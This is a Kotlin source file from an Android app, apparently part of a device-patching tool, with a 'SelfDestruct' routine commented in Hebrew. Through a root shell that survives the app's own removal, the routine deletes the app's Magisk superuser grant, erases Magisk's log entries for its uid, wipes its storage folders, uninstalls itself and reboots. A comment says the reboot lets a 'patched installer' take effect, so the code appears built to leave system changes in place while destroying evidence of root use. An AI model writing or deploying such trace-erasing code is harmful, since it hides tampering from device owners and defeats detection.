package com.orech.seller

import android.content.Context
import android.os.Process
import com.orech.patcher.RootShell

/**
 * הסרה עצמית בסיום התהליך: מבטלת את הרשאת ה-root של האפליקציה, מוחקת קבצים שנשארו
 * באחסון המשותף, מסירה את האפליקציה ומאתחלת. הכול רץ מתוך קונכייה מנותקת
 * שממשיכה לרוץ אחרי שתהליך האפליקציה נהרג בהסרה.
 *
 * ההרשאה ב-Magisk נשמרת לפי uid (טבלת policies), לכן מוחקים לפי uid. אם ה-su או
 * ה-sqlite של הגרסה במכשיר שונים, כל שלב רץ בנפרד ונכשל בשקט בלי לעצור את ההסרה.
 */
object SelfDestruct {

    fun run(context: Context) {
        val pkg = context.packageName
        val uid = Process.myUid()
        val steps = listOf(
            "magisk --sqlite \"DELETE FROM policies WHERE uid=$uid\"",
            "magisk --sqlite \"DELETE FROM logs WHERE from_uid=$uid\"",
            "rm -rf /sdcard/Android/data/$pkg /sdcard/Android/media/$pkg",
            "pm uninstall $pkg",
            // אתחול נדרש כדי שהמתקין המתוקן וההגדרות ייכנסו לתוקף.
            "reboot"
        )
        val script = steps.joinToString("; ")
        RootShell.exec("nohup sh -c 'sleep 3; $script' </dev/null >/dev/null 2>&1 &")
    }
}
